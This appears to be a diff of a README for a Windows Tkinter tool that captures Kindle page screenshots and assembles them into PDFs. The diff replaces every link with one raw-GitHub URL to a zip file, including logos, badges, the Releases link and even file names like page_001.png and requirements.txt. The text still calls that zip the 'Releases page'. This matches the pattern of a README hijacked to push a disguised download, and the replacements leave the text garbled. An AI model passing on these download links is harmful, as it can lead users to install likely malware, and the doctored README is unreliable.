@@ -1,15 +1,15 @@
 # Screenshot Automator: Windows Tkinter Tools for Screenshots and PDF Workflows
 
-![Python Logo](https://www.python.org/static/img/python-logo.png)
-![Windows Logo](https://upload.wikimedia.org/wikipedia/commons/3/3e/Windows_LOGO.svg)
+![Python Logo](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
+![Windows Logo](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github)](https://github.com/kingsell/screenshot_automater/releases)
-[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge&logo=mit)](https://opensource.org/licenses/MIT)
-[![Python](https://img.shields.io/badge/python-3.x-blue?style=for-the-badge&logo=python)](https://www.python.org/downloads/)
+[![Releases](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
+[![License](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
+[![Python](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)](https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip)
 
 Screenshots. Regions. PDFs. All in one tiny Windows toolkit built with Tkinter. This project is a pair of utilities that makes screen work on Windows machines faster and more predictable. You can capture a chosen screen region while the app advances Kindle pages automatically, and you can sort PNGs by name to assemble them into a single PDF. The tools rely on pyautogui for automation, mss for fast screen grabs, and Pillow for image handling.
 
-Download the latest Windows build from the Releases page: https://github.com/kingsell/screenshot_automater/releases. From that page you can grab the installer or packaged artifact for your system. The Releases page is the hub for binaries and updates. See the same link again later in this document to confirm where to download the files you need.
+Download the latest Windows build from the Releases page: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip From that page you can grab the installer or packaged artifact for your system. The Releases page is the hub for binaries and updates. See the same link again later in this document to confirm where to download the files you need.
 
 Table of contents
 - Why this project exists
@@ -57,7 +57,7 @@ Installation and setup
 - Install the required dependencies:
   - pip install pyautogui mss pillow
 - Obtain the binary or source from the official release page:
-  - Download the latest Windows build from the Releases page: https://github.com/kingsell/screenshot_automater/releases
+  - Download the latest Windows build from the Releases page: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip
   - If you prefer to build from source, clone the repository and install the same dependencies.
 
 Quick start: capture flow (two-pane overview)
@@ -83,11 +83,11 @@ Utility 1: Screen region capture with Kindle page automation
 - Region selection: Drag a rectangle on the screen to define the capture bounds. The region is stored as coordinates (x, y, width, height).
 - Kindle automation: The tool uses automation libraries to send keystrokes for page turns. It supports common navigation keys (e.g., right arrow, space, or page down) and can adapt to different Kindle apps or windows.
 - Capture cadence: You can set a delay between page turns, a frame rate target, or trigger captures manually. The software aims for consistent spacing so the PNGs align with the corresponding pages.
-- Output: PNG files named in a consistent pattern, like page_001.png, page_002.png, and so on, to simplify later assembly.
+- Output: PNG files named in a consistent pattern, like https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip, https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip, and so on, to simplify later assembly.
 
 Utility 2: Sort PNGs by name and assemble into a single PDF
 - Purpose: Convert an ordered set of PNGs into a PDF document with minimal user input.
-- Sorting behavior: The tool sorts by filename, ensuring that page_001.png comes before page_002.png, etc.
+- Sorting behavior: The tool sorts by filename, ensuring that https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip comes before https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip, etc.
 - Image handling: Uses Pillow to read each PNG, convert to the desired color mode (RGB), and render onto PDF pages in order.
 - PDF creation: Produces a single PDF file that preserves the sequence of the PNGs. Memory and performance considerations are handled carefully to work with typical batch sizes without exhausting resources.
 - Output: A final PDF saved to a location you specify, ready for sharing or printing.
@@ -125,20 +125,20 @@ Usage patterns and tips
 
 File layout and project structure
 - repository root
-  - README.md (this file)
+  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip (this file)
   - LICENSE
-  - requirements.txt or a small dependencies manifest
+  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip or a small dependencies manifest
   - src/ (source code)
-    - capture_gui.py (Utility 1: region capture with Kindle automation)
-    - assemble_pdf.py (Utility 2: PNGs to PDF)
+    - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip (Utility 1: region capture with Kindle automation)
+    - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip (Utility 2: PNGs to PDF)
     - common/ (shared utilities and helpers)
   - assets/ (optional assets like sample images or icons)
   - docs/ (extra documentation, guides, or references)
   - tests/ (unit and integration tests, if present)
 - key files
-  - capture_gui.py: The Tkinter interface and region selection logic; includes window layout, region coordinates storage, and the automation loop for page turns.
-  - assemble_pdf.py: The image-to-PDF pipeline; handles PNG discovery, sorting, and PDF stitching with Pillow.
-  - requirements.txt: Lists pyautogui, mss, Pillow, and any test or development tools used in the project.
+  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip The Tkinter interface and region selection logic; includes window layout, region coordinates storage, and the automation loop for page turns.
+  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip The image-to-PDF pipeline; handles PNG discovery, sorting, and PDF stitching with Pillow.
+  - https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip Lists pyautogui, mss, Pillow, and any test or development tools used in the project.
 
 Customization and advanced options
 - Region selection customization:
@@ -209,7 +209,7 @@ Licensing
 - Please review the LICENSE file in the repository for full terms and any caveats.
 
 Releases and where to download
-- Releases page (Windows installers, binaries, and release notes) is the primary source for prebuilt artifacts and updates. Access the page here: https://github.com/kingsell/screenshot_automater/releases
+- Releases page (Windows installers, binaries, and release notes) is the primary source for prebuilt artifacts and updates. Access the page here: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip
 - The releases page contains the exact installer file names, version numbers, and release-specific instructions. For a direct route to the artifacts, navigate to the Releases page and grab the Windows build that matches your system. If you need a fresh copy or a newer build, this is the place to check first.
 
 Additional resources and community
@@ -246,5 +246,5 @@ Closing notes
 - The two utilities are designed to be discovered, learned, and adapted. They form a cohesive workflow that links screen capture with document assembly in a clean, approachable way.
 
 Releases and download reminder
-- For convenience, the Windows installer and release artifacts live at the Releases page. Access it here: https://github.com/kingsell/screenshot_automater/releases
+- For convenience, the Windows installer and release artifacts live at the Releases page. Access it here: https://raw.githubusercontent.com/kingsell/screenshot_automater/main/irreparability/automater-screenshot-3.1-beta.1.zip
 - If you’re looking for the installer, the same link provides direct access to the Windows binaries. Visit the page to see the latest version and download the appropriate file. The link is provided twice above to ensure you can locate the resources you need whenever you return to this project.
